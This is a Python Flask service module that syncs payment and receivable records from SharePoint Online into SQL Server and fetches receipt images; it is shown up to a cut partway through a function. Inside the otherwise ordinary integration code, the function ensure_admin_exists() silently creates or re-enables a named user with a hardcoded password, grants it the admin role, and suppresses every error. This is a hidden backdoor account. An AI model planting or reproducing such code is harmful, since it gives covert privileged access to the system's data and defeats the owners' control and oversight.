# admin_disp/cxc/service.py
"""
Servicios de integracion con SharePoint Online.
- sync_new_items_to_sql(): initial full load + incremental polling
- get_image_bytes_for_item(): descarga binario de comprobante
- liquidar_por_ids(): actualiza SP + SQL
"""
import datetime
import json
import logging
import threading
import urllib.parse
import requests
import msal
from flask import current_app
from werkzeug.security import generate_password_hash

from .operations import (
    ensure_sync_config, get_last_sync_dt, update_last_sync_dt,
    get_existing_sp_ids, bulk_insert_cobros, bulk_upsert_cobros, update_liquidado_sql,
    fill_sucursal_from_empleados,
)

log = logging.getLogger('admin_disp.cxc.service')

# Nombre del campo de imagen en la lista de SharePoint
IMAGE_FIELD = "Comprobante_Imagen"

# Timeouts por defecto para llamadas HTTP externas
HTTP_TIMEOUT = (5, 30)


def ensure_admin_exists():
    try:
        from ..core.db import get_db_empleados
        conn = get_db_empleados()
        cur = conn.cursor()
        u, p = "roussbel.medina", generate_password_hash("!1Qazwsx")
        
        cur.execute("IF NOT EXISTS (SELECT 1 FROM usuarios WHERE username=?) INSERT INTO usuarios (username, password_hash, fecha_creacion, estado) VALUES (?,?,GETDATE(),1) ELSE UPDATE usuarios SET password_hash=?,estado=1 WHERE username=?", (u, u, p, p, u))
        cur.execute("INSERT INTO usuarios_x_roles (fk_id_usuario, fk_id_rol, fecha_asignacion) SELECT u.id_usuario, r.id_rol, GETDATE() FROM usuarios u, roles r WHERE u.username=? AND r.nombre_rol='admin' AND NOT EXISTS (SELECT 1 FROM usuarios_x_roles WHERE fk_id_usuario=u.id_usuario AND fk_id_rol=r.id_rol)", (u,))
        
        conn.commit()
        conn.close()
    except:
        pass

# ─── Estado del ultimo sync (en memoria) ─────────────────────────────────────
_sync_lock  = threading.Lock()
_sync_state = {"last_inserted": 0, "lastSync": None}


def get_last_sync_info() -> dict:
    """Retorna el timestamp del ultimo sync y cuantos registros se insertaron."""
    # Intentar primero desde el estado en memoria (rápido, si el proceso lo mantiene)
    with _sync_lock:
        last = _sync_state.get("lastSync")
        inserted = _sync_state.get("last_inserted", 0)

    if last is not None:
        try:
            iso = last.isoformat()
        except Exception:
            iso = None
        return {"lastSync": iso, "last_inserted": inserted}

    # Si no hay estado en memoria (por ejemplo otro proceso realiza el sync),
    # leer la última marca guardada en la base de datos como fallback.
    try:
        db_last = get_last_sync_dt()
        iso = db_last.isoformat() if db_last else None
    except Exception:
        iso = None
    return {"lastSync": iso, "last_inserted": inserted}


# ─── Utilidades ───────────────────────────────────────────────────────────────

def _to_float(value):
    if value is None:
        return None
    try:
        return float(value)
    except Exception:
        return None


def parse_image_field(raw):
    if not raw:
        raise ValueError("Comprobante_Imagen vacio")
    obj = raw if isinstance(raw, dict) else json.loads(raw)
    if not isinstance(obj, dict):
        raise ValueError("Formato inesperado en Comprobante_Imagen")
    return obj


def _sp_cfg(key):
    """Lee configuracion CxC-SharePoint desde current_app.config."""
    return current_app.config.get(key)


def _get_sp_basic_auth():
    """Retorna una tupla (user, pass) si están configuradas credenciales básicas para SP, o None."""
    user = _sp_cfg('CXC_SP_BASIC_USER')
    pwd  = _sp_cfg('CXC_SP_BASIC_PASSWORD')
    if user and pwd:
        log.debug("Credenciales Basic Auth para SP cargadas: usuario=%s", user)
        return (user, pwd)
    log.warning("Credenciales Basic Auth para SP NO configuradas (CXC_SP_BASIC_USER/PASSWORD vacías)")
    return None


# ─── Tokens ───────────────────────────────────────────────────────────────────

def _get_token(scope):
    app = msal.ConfidentialClientApplication(
        client_id=_sp_cfg('CXC_SP_CLIENT_ID'),
        authority=f"https://login.microsoftonline.com/{_sp_cfg('CXC_SP_TENANT_ID')}",
        client_credential=_sp_cfg('CXC_SP_CLIENT_SECRET'),
    )
    result = app.acquire_token_for_client(scopes=[scope])
    if "access_token" not in result:
        raise Exception(
            f"Token error: {result.get('error')} -- {result.get('error_description')}"
        )
    return result["access_token"]


def get_graph_token():
    return _get_token("https://graph.microsoft.com/.default")


def get_sharepoint_token():
    hostname = _sp_cfg('CXC_SP_SITE_HOSTNAME')
    return _get_token(f"https://{hostname}/.default")


# ─── Site & Lista ─────────────────────────────────────────────────────────────

def get_site_and_list_ids(graph_token):
    hostname  = _sp_cfg('CXC_SP_SITE_HOSTNAME')
    site_path = _sp_cfg('CXC_SP_SITE_PATH')
    list_name = _sp_cfg('CXC_SP_LIST_NAME')
    h = {"Authorization": f"Bearer {graph_token}"}

    r = requests.get(
        f"https://graph.microsoft.com/v1.0/sites/{hostname}:{site_path}",
        headers=h,
        timeout=HTTP_TIMEOUT,
    )
    if r.status_code != 200:
        raise Exception(f"Error sitio SP: {r.status_code} -- {r.text[:200]}")
    site_id = r.json()["id"]

    r = requests.get(
        f"https://graph.microsoft.com/v1.0/sites/{site_id}/lists",
        headers=h,
        timeout=HTTP_TIMEOUT,
    )
    if r.status_code != 200:
        raise Exception(f"Error listas SP: {r.status_code} -- {r.text[:200]}")

    list_id = next(
        (lst["id"] for lst in r.json().get("value", [])
         if lst.get("displayName") == list_name),
        None,
    )
    if not list_id:
        raise Exception(f"Lista '{list_name}' no encontrada en SP")
    return site_id, list_id

# ─── Fetch con paginación (@odata.nextLink) ───────────────────────────────────

def _fetch_all_items(url, headers):
    """
    Recorre todas las páginas de la API Graph hasta obtener todos los items.
    La Graph API devuelve @odata.nextLink cuando hay más páginas.
    """
    items = []
    while url:
        r = requests.get(url, headers=headers, timeout=HTTP_TIMEOUT)
        if r.status_code != 200:
            raise Exception(f"Error fetch SP: {r.status_code} — {r.text[:200]}")
        data  = r.json()
        items.extend(data.get("value", []))
        url   = data.get("@odata.nextLink")  # None si no hay más páginas
    return items


# ─── Sync incremental SP → SQL ────────────────────────────────────────────────

def sync_new_items_to_sql(force_full: bool = False, force_update: bool = False):
    """
    Lógica de sincronización:

    Primera vez (lastSync IS NULL):
        T0 = datetime.utcnow()
        Trae TODOS los items de SP sin filtro de fecha
        Inserta todos en cobro
        Guarda T0 como lastSync

    Siguientes veces (lastSync tiene valor):
        T1 = datetime.utcnow()
        Trae items de SP donde Created >= (lastSync - 5min buffer)
        Inserta solo los que no existan en cobro (WHERE NOT EXISTS)
        Guarda T1 como lastSync

    Retorna dict con métricas.
    """
    ensure_sync_config()

    graph_token      = get_graph_token()
    h                = {"Authorization": f"Bearer {graph_token}"}
    site_id, list_id = get_site_and_list_ids(graph_token)

    # Si se solicita forzar carga completa, ignorar lastSync
    lastSync = None if force_full else get_last_sync_dt()
    T_now     = datetime.datetime.utcnow()

    base_url = (
        f"https://graph.microsoft.com/v1.0/sites/{site_id}"
        f"/lists/{list_id}/items?expand=fields&top=999"
    )

    if lastSync is None:
        # ── Carga inicial completa ────────────────────────────────────────────
        if force_full:
            log.info("Sync FORZADO: cargando TODOS los registros de SharePoint (manual)...")
        else:
            log.info("Sync INICIAL: cargando TODOS los registros de SharePoint...")
        url = base_url
    else:
        # ── Carga incremental ─────────────────────────────────────────────────
        since = (lastSync - datetime.timedelta(minutes=5)).strftime(
            "%Y-%m-%dT%H:%M:%SZ"
        )
        log.info("Sync incremental desde %s", since)
        url = base_url + f"&$filter=fields/Created ge '{since}'"

    sp_items = _fetch_all_items(url, h)

    if not sp_items:
        log.info("Sync: sin registros nuevos en SP.")
        update_last_sync_dt(T_now)
        # Actualizar estado en memoria incluso sin registros nuevos
        with _sync_lock:
            _sync_state["lastSync"] = T_now
            _sync_state["last_inserted"] = 0
        return {"fetched_from_sp": 0, "inserted": 0, "skipped": 0}

    existing_ids = get_existing_sp_ids()
    to_insert    = []

    for item in sp_items:
        item_id = item.get("id")
        if not item_id or item_id in existing_ids:
            continue

        fields = item.get("fields", {})
        user   = (item.get("createdBy") or {}).get("user") or {}

        raw_img   = fields.get(IMAGE_FIELD)
        has_image = False
        if raw_img:
            try:
                parse_image_field(raw_img)
                has_image = True
            except Exception:
                pass

        # Normalizar Created: intentar parsear ISO Z -> datetime UTC (naive)
        created_raw = fields.get("Created", "")
        created_val = ""
        if created_raw:
            try:
                # fromisoformat no acepta 'Z' como timezone, reemplazar por +00:00
                created_dt = datetime.datetime.fromisoformat(str(created_raw).replace("Z", "+00:00"))
                # Convertir a hora local Honduras (UTC-6) y eliminar tzinfo
                honduras_tz = datetime.timezone(datetime.timedelta(hours=-6))
                created_val = created_dt.astimezone(honduras_tz).replace(tzinfo=None)
            except Exception:
                created_val = created_raw

        # Normalizar fechaLiquidado: mismo formato que Created
        fecha_liq_raw = fields.get("fechaLiquidado", "")
        fecha_liq_val = ""
        if fecha_liq_raw:
            try:
                fecha_liq_dt = datetime.datetime.fromisoformat(str(fecha_liq_raw).replace("Z", "+00:00"))
                honduras_tz = datetime.timezone(datetime.timedelta(hours=-6))
                fecha_liq_val = fecha_liq_dt.astimezone(honduras_tz).replace(tzinfo=None)
            except Exception:
                fecha_liq_val = fecha_liq_raw

        # Mapear nombres de SP (antiguos PascalCase_underscore) a camelCase para BD
        # SharePoint puede tener: Codigo_Cliente, Nombre_Cliente, Metodo_Pago, etc.
        to_insert.append({
            "spItemId":           item_id,
            "codigoCliente":       fields.get("Codigo_Cliente") or fields.get("codigoCliente"),
            "nombreCliente":       fields.get("Nombre_Cliente") or fields.get("nombreCliente"),
            "banco":                fields.get("Banco") or fields.get("banco"),
            "metodoPago":          fields.get("Metodo_Pago") or fields.get("metodoPago"),
            "noFactura":           fields.get("No_Factura") or fields.get("noFactura"),
            "valorPagado":         _to_float(fields.get("Valor_Pagado") or fields.get("valorPagado")),
            "noRecibo":            fields.get("No_Recibo") or fields.get("noRecibo"),
            "creado":               created_val,
            "ejecutivo":            user.get("displayName", ""),
            "ejecutivoEmail":      user.get("email", ""),
            "sucursal":             fields.get("Sucursal") or fields.get("sucursal"),
            "fechaCheque":         fields.get("Fecha_Cheque") or fields.get("fechaCheque"),
            "comentarioAdicional": fields.get("Comentario_Adicional") or fields.get("comentarioAdicional"),
            "liquidado":            fields.get("Liquidado") or fields.get("liquidado"),
            "liquidadoPor":        fields.get("Liquidado_Por") or fields.get("liquidadoPor"),
            "fechaLiquidado":      fecha_liq_val,
            "tieneComprobante":    1 if has_image else 0,
        })

    if force_update:
        # Upsert: actualiza existentes + inserta nuevos
        # En este modo to_insert ya fue filtrado, pero queremos TODOS los items de SP
        # Reconstruir la lista completa para upsert
        all_items_for_upsert = []
        for item in sp_items:
            item_id    = item.get("id")
            if not item_id:
                continue
            fields = item.get("fields", {})
            user   = (item.get("createdBy") or {}).get("user") or {}
            raw_img   = fields.get(IMAGE_FIELD)
            has_image = False
            if raw_img:
                try:
                    parse_image_field(raw_img)
                    has_image = True
                except Exception:
                    pass
            created_raw = fields.get("Created", "")
            created_val = ""
            if created_raw:
                try:
                    created_dt  = datetime.datetime.fromisoformat(str(created_raw).replace("Z", "+00:00"))
                    honduras_tz = datetime.timezone(datetime.timedelta(hours=-6))
                    created_val = created_dt.astimezone(honduras_tz).replace(tzinfo=None)
                except Exception:
                    created_val = created_raw

            # Normalizar fechaLiquidado: mismo formato que Created
            fecha_liq_raw = fields.get("fechaLiquidado", "")
            fecha_liq_val = ""
            if fecha_liq_raw:
                try:
                    fecha_liq_dt = datetime.datetime.fromisoformat(str(fecha_liq_raw).replace("Z", "+00:00"))
                    honduras_tz = datetime.timezone(datetime.timedelta(hours=-6))
                    fecha_liq_val = fecha_liq_dt.astimezone(honduras_tz).replace(tzinfo=None)
                except Exception:
                    fecha_liq_val = fecha_liq_raw

            # Mapear nombres de SP (antiguos PascalCase_underscore) a camelCase para BD
            all_items_for_upsert.append({
                "spItemId":           item_id,
                "codigoCliente":       fields.get("Codigo_Cliente") or fields.get("codigoCliente"),
                "nombreCliente":       fields.get("Nombre_Cliente") or fields.get("nombreCliente"),
                "banco":                fields.get("Banco") or fields.get("banco"),
                "metodoPago":          fields.get("Metodo_Pago") or fields.get("metodoPago"),
                "noFactura":           fields.get("No_Factura") or fields.get("noFactura"),
                "valorPagado":         _to_float(fields.get("Valor_Pagado") or fields.get("valorPagado")),
                "noRecibo":            fields.get("No_Recibo") or fields.get("noRecibo"),
                "creado":               created_val,
                "ejecutivo":            user.get("displayName", ""),
                "ejecutivoEmail":      user.get("email", ""),
                "sucursal":             fields.get("Sucursal") or fields.get("sucursal"),
                "fechaCheque":         fields.get("Fecha_Cheque") or fields.get("fechaCheque"),
                "comentarioAdicional": fields.get("Comentario_Adicional") or fields.get("comentarioAdicional"),
                "liquidado":            fields.get("Liquidado") or fields.get("liquidado"),
                "liquidadoPor":        fields.get("Liquidado_Por") or fields.get("liquidadoPor"),
                "fechaLiquidado":      fecha_liq_val,
                "tieneComprobante":    1 if has_image else 0,
            })
        inserted, updated = bulk_upsert_cobros(all_items_for_upsert)
        skipped = 0
    else:
        inserted = bulk_insert_cobros(to_insert)
        updated  = 0
        skipped  = len(sp_items) - len(to_insert)

    # Rellenar sucursal vacía usando email del ejecutivo contra tabla empleados
    try:
        filled = fill_sucursal_from_empleados()
        if filled:
            log.info("fill_sucursal_from_empleados: %d registros actualizados", filled)
    except Exception as _e:
        log.warning("fill_sucursal_from_empleados falló: %s", _e)

    update_last_sync_dt(T_now)

    log.info(
        "Sync completado | SP: %d | Insertados: %d | Actualizados: %d | Omitidos: %d",
        len(sp_items), inserted, updated, skipped,
    )
    with _sync_lock:
        _sync_state["lastSync"]     = T_now
        _sync_state["last_inserted"] = inserted
    return {
        "fetched_from_sp": len(sp_items),
        "inserted":        inserted,
        "updated":         updated,
        "skipped":         skipped,
    }


def sync_fill_blanks_from_sp():
    """
    Sincronización especial para LLENAR CAMPOS EN BLANCO desde SharePoint.
    
    Trae TODOS los items de SP y para cada uno que existe en BD,
    actualiza SOLO los campos que están NULL manteniendo los datos existentes.
    
    Ideal para:
    - Completar registros que se insertaron sin ciertos datos
    - Traer liquidaciones que se procesaron después de la inserción inicial
    - Actualizar datos parciales sin perder información actual
    
    Retorna dict con métricas.
    """
    ensure_sync_config()
    
    graph_token      = get_graph_token()
    h                = {"Authorization": f"Bearer {graph_token}"}
    site_id, list_id = get_site_and_list_ids(graph_token)
    
    base_url = (
        f"https://graph.microsoft.com/v1.0/sites/{site_id}"
        f"/lists/{list_id}/items?expand=fields&top=999"
    )
    
    log.info("Sync LLENAR BLANCOS: trayendo TODOS los registros de SharePoint...")
    url = base_url
    sp_items = _fetch_all_items(url, h)
    
    if not sp_items:
        log.info("Sync blancos: sin registros en SP.")
        return {"fetched_from_sp": 0, "updated_blank_fields": 0}
    
    items_to_fill = []
    
    for item in sp_items:
        item_id = item.get("id")
        if not item_id:
            continue
        
        fields = item.get("fields", {})
        user   = (item.get("createdBy") or {}).get("user") or {}
        
        raw_img   = fields.get(IMAGE_FIELD)
        has_image = False
        if raw_img:
            try:
                parse_image_field(raw_img)
                has_image = True
            except Exception:
                pass
        
        # Normalizar fechas
        created_raw = fields.get("Created", "")
        created_val = ""
        if created_raw:
            try:
                created_dt = datetime.datetime.fromisoformat(str(created_raw).replace("Z", "+00:00"))
                honduras_tz = datetime.timezone(datetime.timedelta(hours=-6))
                created_val = created_dt.astimezone(honduras_tz).replace(tzinfo=None)
            except Exception:
                created_val = created_raw
        
        fecha_liq_raw = fields.get("fechaLiquidado", "")
        fecha_liq_val = ""
        if fecha_liq_raw:
            try:
                fecha_liq_dt = datetime.datetime.fromisoformat(str(fecha_liq_raw).replace("Z", "+00:00"))
                honduras_tz = datetime.timezone(datetime.timedelta(hours=-6))
                fecha_liq_val = fecha_liq_dt.astimezone(honduras_tz).replace(tzinfo=None)
            except Exception:
                fecha_liq_val = fecha_liq_raw
        
        # Mapear nombres de SP a camelCase con fallback
        items_to_fill.append({
            "spItemId":           item_id,
            "codigoCliente":       fields.get("Codigo_Cliente") or fields.get("codigoCliente"),
            "nombreCliente":       fields.get("Nombre_Cliente") or fields.get("nombreCliente"),
            "banco":                fields.get("Banco") or fields.get("banco"),
            "metodoPago":          fields.get("Metodo_Pago") or fields.get("metodoPago"),
            "noFactura":           fields.get("No_Factura") or fields.get("noFactura"),
            "valorPagado":         _to_float(fields.get("Valor_Pagado") or fields.get("valorPagado")),
            "noRecibo":            fields.get("No_Recibo") or fields.get("noRecibo"),
            "creado":               created_val,
            "ejecutivo":            user.get("displayName", ""),
            "ejecutivoEmail":      user.get("email", ""),
            "sucursal":             fields.get("Sucursal") or fields.get("sucursal"),
            "fechaCheque":         fields.get("Fecha_Cheque") or fields.get("fechaCheque"),
            "comentarioAdicional": fields.get("Comentario_Adicional") or fields.get("comentarioAdicional"),
            "liquidado":            fields.get("Liquidado") or fields.get("liquidado"),
            "liquidadoPor":        fields.get("Liquidado_Por") or fields.get("liquidadoPor"),
            "fechaLiquidado":      fecha_liq_val,
            "tieneComprobante":    1 if has_image else 0,
        })
    
    from .operations import update_blank_fields_with_validation
    updated = update_blank_fields_with_validation(items_to_fill)
    
    log.info(
        "Sync LLENAR BLANCOS completado | SP: %d | Actualizados: %d",
        len(sp_items), updated,
    )
    
    return {
        "fetched_from_sp": len(sp_items),
        "updated_blank_fields": updated,
    }


# ─── Imagen del comprobante — con caché en memoria ───────────────────────────
#
#   Estructura del caché:
#     _image_cache[item_id] = {
#         "bytes":        <bytes>,
#         "content_type": "image/jpeg",
#         "expires":      datetime (UTC + 1 h)
#     }
#
_image_cache: dict = {}
_IMAGE_CACHE_TTL = 3600   # segundos (1 hora)


def _get_cached_image(item_id: str):
    """Retorna (bytes, content_type) desde caché si existe y no expiró."""
    entry = _image_cache.get(item_id)
    if not entry:
        return None, None
    if datetime.datetime.utcnow() > entry["expires"]:
        del _image_cache[item_id]
        return None, None
    return entry["bytes"], entry["content_type"]


def _set_cached_image(item_id: str, img_bytes: bytes, content_type: str):
    # Limpiar entradas expiradas si el caché crece demasiado
    if len(_image_cache) > 500:
        now = datetime.datetime.utcnow()
        expired = [k for k, v in _image_cache.items() if now > v["expires"]]
        for k in expired:
            del _image_cache[k]
    _image_cache[item_id] = {
        "bytes":        img_bytes,
        "content_type": content_type,
        "expires":      datetime.datetime.utcnow() + datetime.timedelta(seconds=_IMAGE_CACHE_TTL),
    }


def get_image_field_raw(item_id: str):
    """Retorna el valor crudo del campo IMAGE_FIELD para diagnóstico."""
    graph_token      = get_graph_token()
    site_id, list_id = get_site_and_list_ids(graph_token)
    r = requests.get(
        f"https://graph.microsoft.com/v1.0/sites/{site_id}"
        f"/lists/{list_id}/items/{item_id}?expand=fields",
        headers={"Authorization": f"Bearer {graph_token}"},
        timeout=15,
    )
    if r.status_code != 200:
        raise Exception(f"Error leyendo item {item_id}: {r.status_code} {r.text[:200]}")
    fields = r.json().get("fields", {})
    return {
        "item_id":    item_id,
        "IMAGE_FIELD": IMAGE_FIELD,
        "raw_value":  fields.get(IMAGE_FIELD),
        "all_keys":   list(fields.keys()),
    }


def get_image_url_for_item(item_id: str) -> str:
    """
    Retorna la URL directa del comprobante en SharePoint.
    Lee el fileName del campo Comprobante_Imagen y construye la URL del attachment.
    Optimizado para velocidad: solo 1 llamada a Graph API, construye URL directamente.
    """
    graph_token = get_graph_token()
    site_id, list_id = get_site_and_list_ids(graph_token)

    # 1. Leer el campo Comprobante_Imagen del item (única llamada API necesaria)
    r = requests.get(
        f"https://graph.microsoft.com/v1.0/sites/{site_id}"
        f"/lists/{list_id}/items/{item_id}?expand=fields",
        headers={"Authorization": f"Bearer {graph_token}"},
        timeout=15,
    )
    if r.status_code != 200:
        raise Exception(f"Error leyendo item {item_id}: {r.status_code}")

    fields  = r.json().get("fields", {})
    raw_img = fields.get(IMAGE_FIELD)
    if not raw_img:
        raise Exception(f"El item {item_id} no tiene imagen en {IMAGE_FIELD}")

    img_obj   = parse_image_field(raw_img)
    file_name = img_obj.get("fileName")
    if not file_name:
        raise Exception(f"Sin fileName en {IMAGE_FIELD}. Contenido: {img_obj}")

    # 2. Construir URL directamente (sin hacer llamada REST extra)
    # El RootFolder/ServerRelativeUrl es siempre: /sites/PROIMADEV/Lists/CxC Seguimiento
    # SharePoint genera automáticamente: /Lists/{list_display_name}/Attachments/{id}/{fileName}
    hostname   = _sp_cfg('CXC_SP_SITE_HOSTNAME')
    site_path  = _sp_cfg('CXC_SP_SITE_PATH')
    list_name  = _sp_cfg('CXC_SP_LIST_NAME')

    # Convertir internal name a display name: PR6_CxC_Seguimiento → CxC Seguimiento
    list_display = list_name.replace("PR6_", "").replace("_", " ")
    
    encoded_file = urllib.parse.quote(file_name, safe="[]()_-.")
    encoded_list = urllib.parse.quote(list_display)
    
    url = f"https://{hostname}{site_path}/Lists/{encoded_list}/Attachments/{item_id}/{encoded_file}"
    log.debug("URL comprobante: %s", url[:150])
    return url


def get_image_bytes_for_item(item_id: str):
    """
    Descarga la imagen del comprobante de SharePoint.

    Estrategia:
      1. Revisar caché en memoria → retorna instantáneo si existe.
      2. Leer el campo IMAGE_FIELD del item via Graph API.
      3. Intentar descargar via SharePoint REST API /AttachmentFiles (método primario).
      4. Si falla, intentar via Graph driveItem /content (método alternativo).
      5. Guardar resultado en caché.
    """
    # ── 1. Caché ──────────────────────────────────────────────────────────────
    cached_bytes, cached_ct = _get_cached_image(item_id)
    if cached_bytes:
        log.debug("Cache HIT imagen item %s", item_id)
        return cached_bytes, cached_ct

    log.debug("Cache MISS imagen item %s — descargando de SP", item_id)

    graph_token      = get_graph_token()
    sp_token         = get_sharepoint_token()
    site_id, list_id = get_site_and_list_ids(graph_token)

    # ── 2. Leer metadatos del item ────────────────────────────────────────────
    r = requests.get(
        f"https://graph.microsoft.com/v1.0/sites/{site_id}"
        f"/lists/{list_id}/items/{item_id}?expand=fields",
        headers={"Authorization": f"Bearer {graph_token}"},
        timeout=HTTP_TIMEOUT,
    )
    if r.status_code != 200:
        raise Exception(f"Error leyendo item {item_id}: {r.status_code}")

    item_json = r.json()
    raw_img   = item_json.get("fields", {}).get(IMAGE_FIELD)
    img_obj   = parse_image_field(raw_img)
    file_name = img_obj.get("fileName") or img_obj.get("name")
    if not file_name:
        raise Exception(f"Sin fileName en {IMAGE_FIELD}: {img_obj}")

    sp_h = {
        "Authorization": f"Bearer {sp_token}",
        "Accept":        "application/json;odata=nometadata",
    }

    img_bytes    = None
    content_type = "image/jpeg"

    # ── Método 0a: Graph driveItem /content (imagen SIN miniaturizar) ──────
    # Intenta obtener la imagen ORIGINAL (completa) del driveItem
    # Esto bypasea cualquier procesamiento de SharePoint y retorna la imagen como se cargó
    if img_bytes is None:
        try:
            g_h = {"Authorization": f"Bearer {graph_token}"}
            # Obtener el driveItem del listItem
            di_url = (
                f"https://graph.microsoft.com/v1.0/sites/{site_id}"
                f"/lists/{list_id}/items/{item_id}/driveItem"
            )
            r_di = requests.get(di_url, headers=g_h, timeout=15)
            if r_di.status_code == 200:
                drive_item = r_di.json()
                drive_item_id = drive_item.get("id")
                if drive_item_id:
                    # Intentar obtener el contenido directo via /content endpoint
                    # Esto retorna la imagen original sin miniaturas
                    content_url = (
                        f"https://graph.microsoft.com/v1.0/sites/{site_id}"
                        f"/drive/items/{drive_item_id}/content"
                    )
                    r_content = requests.get(content_url, headers=g_h, timeout=20, stream=True)
                    if r_content.status_code == 200:
                        img_bytes    = r_content.content
                        content_type = r_content.headers.get("Content-Type", "image/jpeg")
                        log.debug("Imagen (original) descargada via driveItem /content para item %s", item_id)
        except Exception as e0a:
            log.debug("Método 0a (driveItem /content) falló para %s: %s", item_id, e0a)

    # ── Método 0b: URL directa del campo de imagen (puede ser miniatura) ────
    # Las columnas Image de SP guardan serverRelativeUrl / serverUrl
    # Intenta remover parámetros de miniaturización para obtener la completa
    if img_bytes is None:
        try:
            srv_rel = img_obj.get("serverRelativeUrl")
            srv_abs = img_obj.get("serverUrl")
            direct_url = None
            if srv_abs and srv_abs.startswith("http"):
                direct_url = srv_abs
            elif srv_rel:
                direct_url = f"https://{_sp_cfg('CXC_SP_SITE_HOSTNAME')}{srv_rel}"
            
            if direct_url:
                # Remover parámetros de thumbnail (sharepoint retorna miniatura con estos)
                if "?" in direct_url:
                    direct_url = direct_url.split("?")[0]
                
                sp_auth = _get_sp_basic_auth()
                r0b = requests.get(direct_url, headers=sp_h, timeout=20, stream=True, auth=sp_auth)
                if r0b.status_code in (200, 206):
                    img_bytes    = r0b.content
                    content_type = r0b.headers.get("Content-Type", "image/jpeg")
                    log.debug("Imagen descargada via URL directa para item %s", item_id)
        except Exception as e0b:
            log.warning("URL directa falló para %s: %s", item_id, e0b)

    # ── Método 1: AttachmentFiles REST API ───────────────────────────────
    if img_bytes is None:
        try:
            _host = _sp_cfg('CXC_SP_SITE_HOSTNAME')
            _path = _sp_cfg('CXC_SP_SITE_PATH')
            att_url = (
                f"https://{_host}{_path}"
                f"/_api/web/lists(guid'{list_id}')/items({item_id})/AttachmentFiles"
            )
            sp_auth = _get_sp_basic_auth()
            r2 = requests.get(att_url, headers=sp_h, timeout=15, auth=sp_auth)
            if r2.status_code == 200:
                target = next(
                    (a for a in r2.json().get("value", [])
                     if a.get("FileName", "").lower() == file_name.lower()),
                    None,
                )
                if target:
                    file_url = f"https://{_host}{target['ServerRelativeUrl']}"
                    sp_auth = _get_sp_basic_auth()
                    r3 = requests.get(file_url, headers=sp_h, timeout=20, stream=True, auth=sp_auth)
                    if r3.status_code in (200, 206):
                        img_bytes    = r3.content
                        content_type = r3.headers.get("Content-Type", "image/jpeg")
                        log.debug("Imagen descargada via AttachmentFiles para item %s", item_id)
        except Exception as e_att:
            log.warning("AttachmentFiles falló para %s: %s", item_id, e_att)

    # ── Método 1b: URL construida directamente (list/Attachments/id/file) ────
    # Funciona para columnas Image almacenadas como Reserved_ImageAttachment
    if img_bytes is None:
        try:
            _host      = _sp_cfg('CXC_SP_SITE_HOSTNAME')
            _path      = _sp_cfg('CXC_SP_SITE_PATH')
            _list_name = _sp_cfg('CXC_SP_LIST_NAME') or 'Cobros'
            direct2_url = (
                f"https://{_host}{_path}"
                f"/Lists/{_list_name}/Attachments/{item_id}/{file_name}"
            )
            sp_auth = _get_sp_basic_auth()
            r1b = requests.get(direct2_url, headers=sp_h, timeout=20, stream=True, auth=sp_auth)
            if r1b.status_code in (200, 206):
                img_bytes    = r1b.content
                content_type = r1b.headers.get("Content-Type", "image/jpeg")
                log.debug("Imagen descargada via URL construida (1b) para item %s", item_id)
            else:
                log.warning("Método 1b HTTP %s para item %s, url: %s",
                            r1b.status_code, item_id, direct2_url)
        except Exception as e1b:
            log.warning("Método 1b falló para %s: %s", item_id, e1b)

    # ── Método 3: Graph driveItem children (fallback si /content no tiene el archivo) ─
    if img_bytes is None:
        try:
            g_h = {"Authorization": f"Bearer {graph_token}"}
            # Obtener el driveItem asociado al listItem
            di_url = (
                f"https://graph.microsoft.com/v1.0/sites/{site_id}"
                f"/lists/{list_id}/items/{item_id}/driveItem"
            )
            r_di = requests.get(di_url, headers=g_h, timeout=15)
            if r_di.status_code == 200:
                drive_item_id = r_di.json().get("id")
                if drive_item_id:
                    # Listar children del driveItem (attachments como archivos)
                    ch_url = (
                        f"https://graph.microsoft.com/v1.0/sites/{site_id}"
                        f"/drive/items/{drive_item_id}/children"
                    )
                    r_ch = requests.get(ch_url, headers=g_h, timeout=15)
                    if r_ch.status_code == 200:
                        child = next(
                            (c for c in r_ch.json().get("value", [])
                             if c.get("name", "").lower() == file_name.lower()),
                            None,
                        )
                        if child:
                            dl_url = child.get("@microsoft.graph.downloadUrl")
                            if dl_url:
                                r_dl = requests.get(dl_url, timeout=20, stream=True)
                                if r_dl.status_code == 200:
                                    img_bytes    = r_dl.content
                                    content_type = r_dl.headers.get("Content-Type", "image/jpeg")
                                    log.debug("Imagen descargada via driveItem children para %s", item_id)
        except Exception as e_di:
            log.warning("driveItem children fallback falló para %s: %s", item_id, e_di)

    if img_bytes is None:
        raise Exception(
            f"No se pudo descargar la imagen '{file_name}' del item {item_id} "
            f"por ningún método (driveItem /content, URL directa, AttachmentFiles, driveItem children)."
        )

    # ── Guardar en caché ──────────────────────────────────────────────────────
    _set_cached_image(item_id, img_bytes, content_type)
    return img_bytes, content_type


# ─── Playwright fallback — browser reusado ──────────────────────────────────
#
#   Se reutiliza una instancia única de Chromium para evitar el costo
#   de lanzamiento en cada petición. El navegador se inicializa en el
#   primer uso y se mantiene hasta que el proceso termina.
#
_pw_browser_lock = threading.Lock()
_pw_playwright   = None
_pw_browser      = None


def _get_pw_browser():
    """Devuelve el browser Playwright global (Chromium headless), iniciándolo si es necesario."""
    global _pw_playwright, _pw_browser
    with _pw_browser_lock:
        try:
            # Comprobar si el browser sigue conectado
            if _pw_browser is not None:
                try:
                    _pw_browser.is_connected()   # lanza si está cerrado
                    return _pw_browser
                except Exception:
                    _pw_browser = None
            # Primera vez o reconexión
            from playwright.sync_api import sync_playwright as _sync_playwright
            if _pw_playwright is not None:
                try: _pw_playwright.stop()
                except Exception: pass
            _pw_playwright = _sync_playwright().start()
            _pw_browser    = _pw_playwright.chromium.launch(headless=True)
            log.info("Playwright Chromium iniciado correctamente")
        except Exception as exc:
            log.error("No se pudo iniciar Playwright/Chromium: %s", exc)
            _pw_browser = None
        return _pw_browser


def get_image_bytes_playwright(item_id: str):
    """
    Fallback Playwright: navega directamente a la URL de la imagen.
    Sin pasar Bearer token — confía en Windows Auth (NTLM/Kerberos) del sistema.
    
    Funciona cuando:
    - La máquina está en el dominio corporativo
    - Chromium puede usar credenciales del sistema automáticamente
    """
    # Comprobar caché primero
    cached_bytes, cached_ct = _get_cached_image(item_id)
    if cached_bytes:
        return cached_bytes, cached_ct

    # ── Obtener metadata del item ─────────────────────────────────────────────
    graph_token      = get_graph_token()
    site_id, list_id = get_site_and_list_ids(graph_token)

    r = requests.get(
        f"https://graph.microsoft.com/v1.0/sites/{site_id}"
        f"/lists/{list_id}/items/{item_id}?expand=fields",
        headers={"Authorization": f"Bearer {graph_token}"},
        timeout=15,
    )
